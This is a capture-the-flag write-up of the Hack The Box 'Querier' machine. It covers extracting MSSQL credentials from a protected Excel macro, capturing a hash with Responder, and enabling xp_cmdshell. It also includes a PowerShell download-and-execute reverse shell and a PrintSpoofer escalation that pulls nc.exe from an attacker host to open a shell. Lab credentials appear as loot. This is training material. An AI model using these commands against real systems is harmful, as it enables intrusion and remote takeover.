# Enumeration 

## open ports

```
135/tcp  open  msrpc         Microsoft Windows RPC                                                                                               
445/tcp  open  microsoft-ds?                                                                                                                     
1433/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM 

5985/tcp  open  wsman
47001/tcp open  winrm

```

### Port 445
![[Pasted image 20230119084958.png]]

we can access Reports
seems like it's workbook is passsword protected 
First change file extension to zip
unzip it and go to xl file
open vbaProject.bin using HxD hex editor 
search for
![[Pasted image 20230119102449.png]]
and change it to DPX
![[Pasted image 20230119102517.png]]

now we can access the code of workbook
Inside xlsm file we found 

![[Pasted image 20230119103116.png]]


The code is connecting to a SQL Server database. The following are the credentials extracted from the code:

Server: QUERIER
Database: volume
Username: reporting
Password: PcwTWTHRwryjc$c6

![[Pasted image 20230119111718.png]]

using [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
![[Pasted image 20230119113513.png]]
starting responder

`sudo responder -I tun0`
![[Pasted image 20230119113542.png]]

![[Pasted image 20230119113556.png]]

cracking the hash
![[Pasted image 20230119113645.png]]

connect to mssql
![[Pasted image 20230119114858.png]]

![[Pasted image 20230119115005.png]]



```
sp_configure 'show advanced options', '1'
RECONFIGURE
sp_configure 'xp_cmdshell', '1'
RECONFIGURE
EXEC master..xp_cmdshell 'whoami'
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.16.19/rev2.ps1") | powershell -noprofile'
```

![[Pasted image 20230119115538.png]]




# Privesc 


![[Pasted image 20230119115618.png]]

Cos it's windows server 2019 juicy potato won't work so we will use print spoofer 



On attacker:
```
nc -lvnp 9002
```

On Target:
```
cd C:\Windows\System32\spool\drivers\color
IWR -Uri http://10.10.16.19/nc.exe -OutFile nc.exe
IWR -Uri http://10.10.16.19/PrintSpoofer64.exe -OutFile sp.exe
.\sp.exe -c "C:\Windows\System32\spool\drivers\color\nc.exe 10.10.16.19 9003 -e cmd"
```

![[Pasted image 20230119125033.png]]

![[Pasted image 20230119125132.png]]




# Loot

mssql creds:
	username: reporting
	Password:PcwTWTHRwryjc$c6

mssql-svc service creds:
	username: mssql-svc
	password:corporate568



---
Tags: #ctf #htb #mssql #printspoofer #responder #Token_impersonation #xls #VBScript #responder #hash_capture 
Resources: [Querier](https://app.hackthebox.com/machines/175)